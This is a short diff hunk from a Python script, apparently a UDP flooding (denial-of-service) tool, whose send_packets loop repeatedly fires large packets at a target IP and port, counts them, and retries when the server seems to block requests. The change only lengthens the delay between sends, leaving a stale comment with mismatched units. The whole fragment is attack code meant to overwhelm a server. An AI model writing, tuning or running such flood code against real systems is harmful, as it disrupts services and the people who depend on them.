@@ -45,7 +45,7 @@ def send_packets(target_ip, target_port):
             sock.sendto(large_packet, (target_ip, target_port))
             packet_count += 1
             print(f"{RED}Тяжелый пакет отправлен на {target_ip}:{target_port} (Всего отправлено: {packet_count}){RESET}")
-            time.sleep(0.001)  # Задержка 0.001 миллисекунд между отправками
+            time.sleep(0.01)  # Задержка 0.001 миллисекунд между отправками
         except socket.error as e:
             print(f"Ошибка: {e}")
             print("Сервер может блокировать запросы. Ожидание перед повторной попыткой...")
